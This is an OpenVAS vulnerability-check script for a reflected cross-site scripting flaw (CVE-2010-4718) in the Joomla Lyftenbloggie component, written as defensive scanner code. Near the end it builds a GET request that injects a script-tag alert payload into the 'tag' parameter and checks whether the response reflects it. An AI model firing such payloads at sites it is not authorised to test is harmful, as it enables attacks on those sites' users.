##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_lyftenbloggie_mult_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Joomla 'Lyftenbloggie' Component Cross-Site Scripting Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let attackers to execute arbitrary script code
  in the browser of an unsuspecting user in the context of the affected site.
  Impact Level: Application.";
tag_affected = "Joomla Lyftenbloggie component version 1.1.0";
tag_insight = "- Input passed via the 'tag' and 'category' parameters to 'index.php'
    (when 'option' is set to 'com_lyftenbloggie') is not properly sanitised
    before being returned to the user.";
tag_solution = "No solution or patch is available as of 10th February 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.lyften.com/products/lyften-bloggie.html";
tag_summary = "This host is running Joomla and is prone to Multiple Cross Site
  Scripting vulnerabilities.";

if(description)
{
  script_id(801741);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-02-15 08:14:35 +0100 (Tue, 15 Feb 2011)");
  script_cve_id("CVE-2010-4718");
  script_bugtraq_id(45468);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("Joomla 'Lyftenbloggie' Component Cross-Site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/42677");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/96761/joomlalyftenbloggie-xss.txt");

  script_description(desc);
  script_summary("Check if Joomla Lyftenbloggie component is vulnerable for XSS attack");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("joomla/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

joomlaPort = get_http_port(default:80);
if(!joomlaPort){
  exit(0);
}

if(!joomlaDir = get_dir_from_kb(port:joomlaPort, app:"joomla")){
  exit(0);
}

sndReq = http_get(item:string(joomlaDir, '/index.php?option=com_lyftenbloggie' +
               '&tag=<script>alert("OpenVAS-XSS-Testing")</script>'),port:joomlaPort);
rcvRes = http_send_recv(port:joomlaPort, data:sndReq);
if('><script>alert("OpenVAS-XSS-Testing")</script><' >< rcvRes)
{
    security_warning(joomlaPort);
    exit(0);
}
